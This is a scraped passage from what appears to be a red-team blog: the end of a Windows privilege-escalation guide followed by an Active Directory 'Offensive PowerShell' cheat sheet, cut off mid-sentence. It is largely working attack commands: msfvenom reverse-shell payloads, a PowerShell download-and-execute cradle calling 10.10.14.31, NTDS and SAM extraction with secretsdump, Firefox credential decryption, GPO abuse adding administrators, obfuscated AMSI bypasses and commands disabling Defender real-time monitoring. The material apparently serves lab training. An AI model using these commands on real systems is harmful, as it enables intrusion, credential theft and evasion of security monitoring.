Windows VM.Windows VM Place y.exe in &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;.Kali VM Wait for a reverse shell on your kali machine.DLL HijackingMethodologyWindows applications usually load DLL files when started. It may happen that a DLL file does not exist and the application is unable to load it. Nevertheless, an application will continue to execute as long as the missing DLL is not needed.In case the application uses a relative and not an absolute file path, Windows searches for the file in the following directories: The directory from which the application is loaded C:\\Windows\\System32 C:\\Windows\\System C:\\Windows The current working directory Directories in the system PATH environment variable Directories in the user PATH environment variableSteps taken to perform DLL hijacking are outlined below. Identify vulnerable application and location Identify applications PID Identify vulnerable DLLs that can be hijacked Use MSFVenom or other payload creation tools to create a malicious DLL Replace the original DLL with the malicious DLL ProfitDetectionWindows VM (RDP is required) Transfer Procmon.exe on the Windows VM Right click on Procmon.exe and select &#39;Run as administrator&#39; from the menu. In procmon, select &quot;filter&quot;. From the left-most drop down menu, select &#39;Process Name&#39;. In the input box on the same line type: dllhijackservice.exe Make sure the line reads ‚ÄúProcess Name is dllhijackservice.exe then Include‚Äù and click on the &#39;Add&#39; button, then &#39;Apply&#39; and lastly on ‚ÄòOK‚Äô. Next, select from the left-most drop down menu &#39;Result&#39;. In the input box on the same line type: NAME NOT FOUND. Make sure the line reads ‚ÄúResult is NAME NOT FOUND then Include‚Äù and click on the &#39;Add&#39; button, then &#39;Apply&#39; and lastly on ‚ÄòOK‚Äô. Open command prompt and type: C:\\Temp&amp;gt; sc start dllsvc Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute &#39;C:\\Temp\\hijackme.dll&#39; yet it could not do that as the file was not found. Note that &#39;C:\\Temp&#39; is a writable location.ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll Copy the generated file hijackme.dll, to the Windows VM.Windows VM Place hijackme.dll in &#39;C:\\Temp&#39; Open command prompt and type: C:\\Temp&amp;gt; sc stop dllsvc &amp;amp; sc start dllsvc Kali VM Wait for a reverse shell on your kali machine.BinPathMethodologyBinPath is a type of Service Escalation. We can gain administrator privileges if we write access and restart access on any service. We can abuse this function by injecting our malicious BinPath to get executed once restarted.DetectionUsing Script on Windows VM Run Powerup.ps1 and Run Invoke-AllChecks (check the service permissions field)C:\\Temp&amp;gt; powershell -ep bypassPS C:\\Temp&amp;gt;. .\\PowerUp.sp1PS C:\\Temp&amp;gt; Invoke-AllChecksChecking manually on Windows VM Run AccessChk64.exeC:\\Temp&amp;gt; accesschk64.exe -uwcv Everyone *# Switch meaning# w --&amp;gt; only show items that have write access# v --&amp;gt; verbose; dispaly as many details as possible# u --&amp;gt; ignore the errors# c --&amp;gt; displays service name of the following# Everyone --&amp;gt; means everyone as a group who hass access Using AccessChk64.exe query the service found C:\\Temp&amp;gt; accesschk64.exe -uwcv daclsvc Find path of the bin file C:\\Temp&amp;gt; sc qc daclsvc ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o reverse.exe Copy the generated file reverse.exe, to the Windows VM.Windows VM Place reverse.exe in &#39;C:\\Temp&#39; In command prompt type: C:\\Temp&amp;gt; sc config daclsvc binpath= &quot;C:\\Temp\\reverse.exe&quot; In command prompt type: C:\\Temp&amp;gt; sc start daclsvc Kali VM Wait for a reverse shell on your kali machine.Unquoted Service PathsMethodologyWhen a service is created whose executable path contains spaces and isn‚Äôt enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege).In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.Detection Run Powerup.ps1 and Run Invoke-AllChecks (check the unquoted service field) C:\\Temp&amp;gt; powershell -ep bypassPS C:\\Temp&amp;gt;. .\\PowerUp.sp1PS C:\\Temp&amp;gt; Invoke-AllChecks ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o common.exe Transfer the generated file, common.exe, to the Windows VM.Windows VM Place common.exe in &#39;C:\\Program Files\\Unquoted Path Service&#39;. Open command prompt and type: C:\\Temp&amp;gt; sc start unquotedsvc# ORC:\\Temp&amp;gt; net start unquotedsvc Kali VM Wait for a reverse shell on your kali machine.Juicy potato attackMethodologyThis privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\\SYSTEM.DetectionWindows VM We should have SeImpersonatePrivilege privileges enabled C:\\Temp&amp;gt;whoami /priv ExploitationKali VM Copy Invoke-PowerShellTcp.ps1 from nishang shells as shell.ps1 Add the line at the bottom of shell.ps1 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.31 -Port 9999 Lets create a shell.bat file powershell -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.31/shell.ps1&#39;) Transfer shell.bat and juicypotato.exe on victim machine $ (new-object net.webclient).downloadfile(&#39;http://10.10.14.31/file&#39;, &#39;C:\\temp\\file&#39;) Set a listener on port 9999 $ sudo rlwrap nc -lnvp 9999 Windows VM Run juicy potato $ ./jp.exe -p shell.bat -l 7777 -t * If this fail Try with a different CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\\SYSTEM Link ‚Äì&amp;gt; http://ohpe.it/juicy-potato/CLSID Lets run again $ ./jp.exe -p shell.bat -l 7777 -t * -c &quot;{e60687f7-01a1-40aa-86ac-db1cbf673334}&quot; Kali VM Wait for a reverse shell on your kali machine.Hot Potato attackMethodologyHot Potato takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP-&amp;gt;SMB relay) and NBNS spoofing.DetectionWindows VM We should have SeImpersonatePrivilege privileges enabled C:\\Temp&amp;gt; whoami /priv ExploitationI will be demonstrating a simple exploitation technique by adding a user to the local administrators group using Tater.ps1Windows VM Enter the following to gain administrator access C:\\Temp&amp;gt; powershell.exe -nop -ep bypassPS C:\\Temp&amp;gt; Import-Module C:\\Temp\\Tater.ps1PS C:\\Temp&amp;gt; Invoke-Tater -Trigger 1 -Command &quot;net localgroup administrators user /add&quot; Kernel ExploitsSearcing exploitsThis method is handy for checking any existing exploits available for the machine by looking at the system information.From the results of windows-exploit-suggester.py we can select one of the kernel exploits and try to escalate privileges.Windows VM Run systeminfo and save it into a text fileC:\\Temp&amp;gt; systeminfoKali VM Pass the file thorugh windows-exploit-suggester.py$ ./windows-exploit-suggester.py --update[*] initiating...[*] successfully requested base url[*] scraped ms download url[+] writing to file 2020-06-06-mssb.xlsx[*] done$ ./windows-exploit-suggester.py --database 2020-06-06-mssb.xlsx --systeminfo systeminfo.txt Exploits will be displayed here...Password Mining Escalation - FirefoxDetection winpeas Path location : C:\\Temp&amp;gt; C:\\Users\\usernamehere\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles RequirementsCopy the following files from the Windows VM to Kali VM: key4.db logins.json addons.json cert9.dbExploitation Download the following $ git clone https://github.com/lclevy/firepwd.git Place the required files in the same directory and run the python file for the creds$ python3 firepwd.py globalSalt: b&#39;2d45b7ac4e42209a23235ecf825c018e0382291d&#39;&amp;lt;SNIP&amp;gt;clearText b&#39;86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808&#39;decrypting login/password pairs https://creds.com:b&#39;mayor&#39;,b&#39;&amp;lt;&amp;lt;HIDDEN&amp;gt;&amp;gt;&#39;Runas-SavdcredsMethodologyWe can check if there are any pre-existing credentials of the administrator on the system. We can abuse this by using the loaded creds for privilege escalation. In the below example, I will demonstrate how to read files through the saved creds.Detection winpeas Checking for existence$ cmdkey /listCurrently stored credentials: Target: Domain:interactive=WORKGROUP\\Administrator Type: Domain Password User: WORKGROUP\\AdministratorExploitation Reading root flagC:\\Temp&amp;gt; C:\\Windows\\System32\\runas.exe /user:ACCESS\\Administrator /savecred &quot;C:\\Windows\\System32\\cmd.exe /c TYPE c:\\Users\\Administrator\\Desktop\\root.txt &amp;gt; C:\\Users\\security\\root1.txt&quot;Backup Operators (Disk shadow + Robocopy)MethodologyIf the user is a part of the Backup Operator group, the user has the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file.Detection The user should be a part of the Backup Operators group and should have SeBackupPrivilege and SeRestorePrivilege EnabledC:\\Temp&amp;gt; net user unsername-hereC:\\Temp&amp;gt; whoami /allExploitationKali VM Create this script and transfer it to Windows VMset verbose onXset metadata C:\\Windows\\Temp\\meta.cabXset context clientaccessibleXset context persistentXbegin backupXadd volume C: alias cdriveXcreateXexpose %cdrive% E:Xend backupXWindows VM Pass the script to diskshadow unility to create the shadow copy PS C:\\Temp&amp;gt; diskshadow /s script.txt Now copy the NTDS file using Robocopy to the Temp file we created in the C: drive PS C:\\Temp&amp;gt; robocopy /b E:\\Windows\\ntds . ntds.dit Next we get the system registry hive that contains the key needed to decrypt the NTDS file with reg save command. PS C:\\Temp&amp;gt; reg save hklm\\system c:\\temp\\system.hive Dumping NTML Hashes We can use secretsdump.py do decrypt the DA creds on Kali VM$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL | tee hash-dumpAbusing GPO permissionsExploitationWe Abusing GPO by adding the user to the local Administrators group leveraging a tool called SharpGPOAbuse.Source : https://github.com/FSecureLABS/SharpGPOAbusePre compiled binaries : https://github.com/Flangvik/SharpCollection Add user to local administrator groupsPS C:\\Enterprise-Share&amp;gt; .\\SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;Debug&quot; --Author vulnnet\\administrator --Command &quot;cmd.exe&quot; --Arguments &quot;/c net localgroup administrators enterprise-security /add&quot; --GPOName &quot;SECURITY-POL-VN&quot;[+] Domain = vulnnet.local[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local[+] GUID of &quot;SECURITY-POL-VN&quot; is: {31B2F340-016D-11D2-945F-00C04FB984F9}[+] Creating file \\\\vulnnet.local\\SysVol\\vulnnet.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml[+] versionNumber attribute changed successfully[+] The version number in GPT.ini was increased successfully.[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.[+] Done! Force Update the systemPS C:\\Enterprise-Share&amp;gt; gpupdate /forceUpdating policy...Computer Policy update has completed successfully.User Policy update has completed successfully. Now review our group memberships after we forced the policies to be updated on the target machine.PS C:\\Enterprise-Share&amp;gt; net user enterprise-security# Will be added to the administrators groupExport LAPS PasswordsMethodologyThe following script assumes that LAPS has already been configured into your environment &amp;amp; that your user account already has access to view LAPS passwords using the Fat Client UI or from Active Directory Users &amp;amp; Computers.This script loads the Active Directory module, finds the LAPS password fields, and then saves them to a CSV with the date appended to the file name. The only thing you‚Äôd need to change is the file path.Exploitation Just Open Powershell and paste this script $Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime$computers | Export-Csv -path c:\\temp\\&quot;LAPS-$((Get-Date).ToString(&quot;MM-dd-yyyy&quot;)).csv&quot; -NoTypeInformation Then, save it to the location of your choice. For this example, I‚Äôm saving to C:\\Scripts\\LAPSexport.ps1 Then, run the script to verify it works correctly. If it does, you should automate this procedure by creating a Scheduled Task.References https://tryhackme.com/room/windowsprivescarena https://docs.microsoft.com/en-us/If you find my articles interesting, you can buy me a coffee" }, { "title": "Active Directory - Offensive PowerShell", "url": "/posts/Offensive-powershell/", "categories": "Red-Teaming, Active-Directory-Offensive-PowerShell", "tags": "active-directory, active-directory-enumeration, offensive-powershell, powershell, amsi-bypass, real-time-monitoring-bypass, bloodhound, trusts-enumeration, GPO-enumeration, ACL-enumeration", "date": "2022-03-30 09:21:00 +0530", "snippet": "IntroductionWelcome to my second article in the Red Teaming Series (Offensive PowerShell). I hope everyone has gone through the first article of this series which explains the basic foundations and concepts required to understand Active Directory.If not so, you can give it a read from here.This guide aims to explain the complete basics to advance enumeration code snippets in Offensive PowerShell and those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.This article will not contain any Attacking PowerShell snippets, ie. Local Privilege Escalation, Domain Persistence, Golden ticket, Silver ticket. The following topics will be covered in a later article.I will cover the following topics under this guide: Introduction to PowerShell Bypassing AMSI and Real-Time-monitoring Basic Enumeration GPO Enumeration ACL Enumeration Trusts Enumeration BloodHound Enumeration Throughout the article, I will use PowerView, which is based on Powershell, to show how to retrieve information from Active Directory.This article has been created with references from a few other articlesAll used references for completing this article will be listed below.‚ÄîIntroduction to PowerShellWhat is PowershellPowershell is the Windows Scripting Language and shell environment that is built using the .NET framework.This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object oriented. This also means that running cmdlets allows you to perform actions on the output object(which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is called Get-Command.Common verbs to use include: Get Start Stop Read Write New OutUsing Get-HelpGet-Help displays information about a cmdlet. To get help about a particular command, run the following:Get-Help Command-NameYou can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following:Using Get-CommandGet-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the followingGet-Command Verb-*# ORGet-Command *-NounRunning the following to view all the cmdlets for the verb new displays the following:Get-Command New-*Object ManipulationIn the previous task, we saw how the output of every cmdlet is an object. If we want to actually manipulate the output, we need to figure out a few things: passing output to other cmdlets using specific object cmdlets to extract informationThe Pipeline(|) is used to pass output from one cmdlet to another. A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet. Like every object in object oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdletVerb-Noun | Get-MemberAn example of running this to view the members for Get-Command is:Get-Command | Get-Member -MemberType MethodFrom the above flag in the command, you can see that you can also select between methods and properties.Creating Objects From Previous cmdletsOne way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet.Here‚Äôs an example of listing the directories and just selecting the mode and the name:You can also use the following flags to select particular information: first - gets the first x object last - gets the last x object unique - shows the unique objects skip - skips x objectsFiltering ObjectsWhen retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties.The general format of the using this cmdlet isVerb-Noun | Where-Object -Property PropertyName -operator Value# ORVerb-Noun | Where-Object {$_.PropertyName -operator Value}The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.Powershell is quite sensitive so make sure you don‚Äôt put quotes around the command!Where -operator is a list of the following operators: -Contains: if any item in the property value is an exact match for the specified value -EQ: if the property value is the same as the specified value -GT: if the property value is greater than the specified valueFor a full list of operators, use this link.Here‚Äôs an example of checking the stopped processes:Sort ObjectWhen a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.The format of the command would beVerb-Noun | Sort-ObjectHere‚Äôs an example of sort the list of directories:Bypassing AMSI and Real-Time-monitoringOnce we get Initial access to our victim machine, we can upload our PowerShell scripts to start the enumeration process. We may notice that our shells get killed or fail at uploading because AV catches them.Even tho AV evasion is a massive topic in itself. I will provide a brief explanation.The Anti-Malware Scan Interface (AMSI) is a PowerShell security feature that will allow any applications or services to integrate into antimalware products. AMSI will scan payloads and scripts before execution inside of the runtime. From Microsoft, ‚ÄúThe Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that‚Äôs present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.‚ÄùFor more information about AMSI, check out the Windows docs, https://docs.microsoft.com/en-us/windows/win32/amsi/Find an example of how data flows inside of Windows security features below.AMSI will send different response codes based on the results of its scans. Find a list of response codes from AMSI below. AMSI_RESULT_CLEAN = 0 AMSI_RESULT_NOT_DETECTED = 1 AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384 AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479 AMSI_RESULT_DETECTED = 32768AMSI is fully integrated into the following Windows components. User Account Control, or UAC PowerShell Windows Script Host (wscript and cscript) JavaScript and VBScript Office VBA macrosAMSI is instrumented in both System.Management.Automation.dll and within the CLR itself. When inside the CLR, it is assumed that Defender is already being instrumented; this means AMSI will only be called when loaded from memory.We can look at what PowerShell security features physically look like and are written using InsecurePowerShell, https://github.com/PowerShell/PowerShell/compare/master‚Ä¶cobbr:master maintained by Cobbr. InsecurePowerShell is a GitHub repository of PowerShell with security features removed; this means we can look through the compared commits and identify any security features. AMSI is only instrumented in twelve lines of code undersrc/System.Management.Automation/engine/runtime/CompiledScriptBlock.csFind the C# code used to instrument AMSI below.var scriptExtent = scriptBlockAst.Extent; if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED) { var parseError = new ParseError(scriptExtent, &quot;ScriptContainedMaliciousContent&quot;, ParserStrings.ScriptContainedMaliciousContent); throw new ParseException(new[] { parseError }); } if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null) { HasSuspiciousContent = true; }Third-parties can also instrument AMSI in their products using the methods outlined below. AMSI Win32 API, https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions AMSI COM Interface, https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistreamBypass AMSINow that we understand the basics of AMSI and how its instrumented, we can begin bypassing AMSI using PowerShell.There are a large number of bypasses for AMSI available, below are a list of few AMSI bypasses.# AMSI obfuscationsET-ItEM ( &#39;V&#39;+&#39;aR&#39; + &#39;IA&#39; + &#39;blE:1q2&#39; + &#39;uZx&#39; ) ( [TYpE]( &quot;{1}{0}&quot;-F&#39;F&#39;,&#39;rE&#39; ) ) ; ( GeT-VariaBle ( &quot;1Q2U&quot; +&quot;zX&quot; ) -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;(( &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f&#39;Util&#39;,&#39;A&#39;,&#39;Amsi&#39;,&#39;.Management.&#39;,&#39;utomation.&#39;,&#39;s&#39;,&#39;System&#39; ) ).&quot;g`etf`iElD&quot;( ( &quot;{0}{2}{1}&quot; -f&#39;amsi&#39;,&#39;d&#39;,&#39;InitFaile&#39; ),( &quot;{2}{4}{0}{1}{3}&quot; -f &#39;Stat&#39;,&#39;i&#39;,&#39;NonPubli&#39;,&#39;c&#39;,&#39;c,&#39; )).&quot;sE`T`VaLUE&quot;( ${n`ULl},${t`RuE} )#Base64[Ref].Assembly.GetType(&#39;System.Management.Automation.&#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;QQBtAHMAaQBVAHQAaQBsAHMA&#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#39;))),&#39;NonPublic,Static&#39;).SetValue($null,$true)#On PowerShell 6[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;s_amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true)Bypass Real-Time-monitoringPowershell Set-MpPreference -DisableRealtimeMonitoring $truePowershell Set-MpPreference -DisableIOAVProtection $trueBasic EnumerationSince we bypassed AMSI and Real-Time protection, we can start with Domain Enumeration and map various entities, trusts, relationships and privileges for the target domain.PowerView EnumerationGet current domainGet-NetDomainGet object of another domainGet-NetDomain -Domain &amp;lt;domain-name&amp;gt;Get domain SID for the current domainGet-DomainSIDGet domain policy for the current domainGet-DomainPolicy(Get-DomainPolicy).&quot;system access&quot;Get domain policy for another domain(Get-DomainPolicy -domain &amp;lt;domain-name&amp;gt;).&quot;system access&quot;(Get-DomainPolicy -domain &amp;lt;domain-name&amp;gt;).&quot;kerberos policy&quot;(Get-DomainPolicy -domain &amp;lt;domain-name&amp;gt;).&quot;Privilege Rights&quot;# OR(Get-DomainPolicy).&quot;KerberosPolicy&quot; #Kerberos tickets info(MaxServiceAge)(Get-DomainPolicy).&quot;SystemAccess&quot; #Password policy(Get-DomainPolicy).PrivilegeRights #Check your privileges Keep note of the kerberos policy as it will be required while making Golden Tickets using mimikats will require the same offsets else it will get blocked by the defendersGet domain controllers for the current domainGet-NetDomainControllerGet domain controllers for another domainGet-NetDomainController -Domain &amp;lt;domain-name&amp;gt;Get a list of users in the current domainGet-NetUserGet-NetUser -Username student1Get list of all properties for users in the current domainGet-UserPropertyGet-UserProperty -Properties pwdlastset,logoncount,badpwdcountGet-UserProperty -Properties logoncountGet-UserProperty -Properties badpwdcount If the logon count and the bad password count of a user is tending to 0 it might be a decoy account. If the password last set of a user was also long back it might be a decoy accountSearch for a particular string in a user‚Äôs attributesFind-UserField -SearchField Description -SearchTerm &quot;built&quot;Get a list of computers in the current domainGet-NetComputerGet-NetComputer -OperatingSystem &quot;*Server 2016*&quot;Get-NetComputer -PingGet-NetComputer -FullData Any computer administrator can create a computer object in the domain which is not an actual computer/Virtual-Machine but its object type is a computerGet all the groups in the current domainGet-NetGroupGet-NetGroup -Domain &amp;lt;targetdomain&amp;gt;Get-NetGroup -FullDataGet-NetComputer -DomainGet all groups containing the word ‚Äúadmin‚Äù in group nameGet-NetGroup *admin*Get-NetGroup -GroupName *admin*Get-NetGroup *admin* -FullDataGet-NetGroup -GroupName *admin* -Doamin &amp;lt;domain-name&amp;gt; Groups like ‚ÄúEnterprise Admins‚Äù,‚ÄùEnterprise Key Admins‚Äù,etc will not be displayed in the above commands unless the domain is not specified because it is only available on the domain controllers of the forest rootGet all the members of the Domain Admins groupGet-NetGroupMember -GroupName &quot;Domain Admins&quot; -Recurse Make sure to check the RID which is the last few charachters of the SID of the member-user as the name of the member-user might be different/changed but the RID is uniqueFor example :It might be an Administrator account having a differnt/changed member-name but if you check the RID and it is ‚Äú500‚Äù then it is an Administrator accountGet the group membership for a userGet-NetGroup -UserName &quot;student1&quot;List all the local groups on a machine (needs administrator privs on non-dc machines)Get-NetLocalGroup -ComputerName &amp;lt;servername&amp;gt; -ListGroupsGet members of all the local groups on a machine (needs administrator privs on non-dc machines)Get-NetLocalGroup -ComputerName &amp;lt;servername&amp;gt; -RecurseGet actively logged users on a computer (needs local admin rights on the target)Get-NetLoggedon -ComputerName &amp;lt;servername&amp;gt; Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)Get-LoggedonLocal -ComputerName &amp;lt;servername&amp;gt;Get the last logged user on a computer (needs administrative rights and remote registry on the target)Get-LastLoggedon -ComputerName &amp;lt;servername&amp;gt;Find shares on hosts in current domain.Invoke-ShareFinder -VerboseFind sensitive files on computers in the domainInvoke-FileFinder -VerboseGet all fileservers of the domainGet-NetFileServerGPO EnumerationGroup Policy provides the ability to manage configuration and changes easily and centrally in AD.Allows configuration of : Security settings Registry-based policy settings Group policy preferences like startup/shutdown/log-on/logoff scripts settings Software installationGPO can be abused for various attacks like privesc, backdoors, persistence etc.PowerView EnumerationGet list of GPO in current domain.Get-NetGPOGet-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.localGet-GPO -All (GroupPolicy module)Get-GPResultantSetOfPolicy -ReportType Html -Path C:\\Users\\Administrator\\report.html (Provides RSoP)gpresult /R /V (GroupPolicy Results of current machine)Get GPO(s) which use Restricted Groups or groups.xml for interesting usersGet-NetGPOGroup Get users which are in a local group of a machine using GPOFind-GPOComputerAdmin -ComputerName student1.dollarcorp.moneycorp.localGet machines where the given user is member of a specific groupFind-GPOLocation -Username student1 -VerboseGet OUs in a domainGet-NetOU -FullDataGet-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} # Get all computers inside an OU (StudentMachines in this case)Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOUGet-NetGPO -GPOname &quot;{AB306569-220D-43FF-BO3B-83E8F4EF8081}&quot;Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 (GroupPolicy module) Enumerate permissions for GPOs where users with RIDs of &amp;gt; -1000 have some kind of modification/control rightsGet-DomainObjectAcl -LDAPFilter &#39;(objectCategory=groupPolicyContainer)&#39; | ? { ($_.SecurityIdentifier -match &#39;^S-1-5-.*-[1-9]\\d{3,}$&#39;) -and ($_.ActiveDirectoryRights -match &#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;)}Get-NetGPO -GPOName &#39;{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}&#39; ACL EnumerationThe Access Control Model enables control on the ability of a process to access objects and other resources in active directory based on: Access Tokens (security context of a process ‚Äî identity and privs of user) Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL)) It is a list of Access Control Entries (ACE) ‚Äî ACE corresponds to individual permission or audits access. Who has permission and what can be done on an object? Two types: DACL : Defines the permissions trustees (a user or group) have on an object. SACL : Logs success and failure audit messages when an object is accessed. ACLs are vital to security architecture of AD.PowerView EnumerationGet the ACLs associated with the specified objectGet-ObjectAcl -SamAccountName student1 -ResolveGUIDsGet the ACLs associated with the specified prefix to be used for searchGet-ObjectAcl -ADSprefix &#39;CN=Administrator,CN=Users&#39; -VerboseWe can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs(Get-Acl &quot;AD:\\CN=Administrator, CN=&amp;lt;name&amp;gt;, DC=&amp;lt;name&amp;gt;, DC=&amp;lt;name&amp;gt;,DC=local&quot;).AccessGet the ACLs associated with the specified LDAP path to be used for searchGet-ObjectAcl -ADSpath &quot;LDAP://CN=Domain Admins,CN=Users,DC=&amp;lt;name&amp;gt;,DC=&amp;lt;name&amp;gt;,DC=local&quot; -ResolveGUIDs -VerboseSearch for interesting ACEsInvoke-ACLScanner -ResolveGUIDsGet the ACLs associated with the specified pathGet-PathAcl -Path &quot;\\\\&amp;lt;computer-name&amp;gt;\\sysvol&quot;Find intresting ACEs (Interesting permisions of ‚Äúunexpected objects‚Äù (RID&amp;gt;1000 and modify permissions) over other objectsFind-InterestingDomainAcl -ResolveGUIDs Check if any of the interesting permissions founds is realated to a username/groupFind-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReference -match &quot;RDPUsers&quot;} Get special rights over All administrators in domainGet-NetGroupMember -GroupName &quot;Administrators&quot; -Recurse | ?{$_.IsGroup -match &quot;false&quot;} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights Trusts Enumeration In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest. Trust can be automatic (parent-child, same forest etc.) or established (forest, external). Trusted Domain Objects (TDOs) represent the trust relationships in a domain.PowerView EnumerationGet all domain trusts (parent, children and external)Get-NetDomainTrustEnumerate all the trusts of all the domains foundGet-NetForestDomain | Get-NetDomainTrust Enumerate also all the trustsGet-DomainTrustMapping Get info of current forest (no external)Get-ForestGlobalCatalog Get info about the external forest (if possible)Get-ForestGlobalCatalog -Forest external.domain Get-DomainTrust -SearchBase &quot;GC://$($ENV:USERDNSDOMAIN)&quot; Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)Get-NetForestTrust Get users with privileges in other domains inside the forestGet-DomainForeingUser Get groups with privileges in other domains inside the forestGet-DomainForeignGroupMember Low Hanging FruitCheck if any user passwords are set$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter &#39;(userPassword=*)&#39; -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty &#39;Password&#39; &quot;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))&quot; -PassThru} | flAsks DC for all computers, and asks every computer if it has admin access (it would be a bit noisy). You need RCP and SMB ports opened.Find-LocalAdminAccess(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed..\\Find-WMILocalAdminAccess.ps1 -ComputerFile .\\computers.txtEnumerate machines where a particular user/group identity has local admin rightsGet-DomainGPOUserLocalGroupMapping -Identity &amp;lt;User/Group&amp;gt;Goes through the list of all computers (from DC) and executes Get-NetLocalGroup to search local admins (you need root privileges on non-dc hosts).Invoke-EnumerateLocalAdminSearch unconstrained delegation computers and show usersFind-DomainUserLocation -ComputerUnconstrained -ShowAllAdmin users that allow delegation, logged into servers that allow unconstrained delegationFind-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegationGet members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.Invoke-UserHunter -CheckAccessSearch ‚ÄúRDPUsers‚Äù usersInvoke-UserHunter -GroupName &quot;RDPUsers&quot;It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)Invoke-UserHunter -StealthBloodHound Enumeration Provides GUI for AD entities and relationships for the data collected by its ingestors. Uses Graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins. Source : https://github.com/BloodHoundAD/BloodHound There are built-in queries for frequently used actions. Also supports custom Cypher queries.SharpHound EnumerationWe can use SharpHound to collect the data, then use neo4j and bloodhound on our local machine and 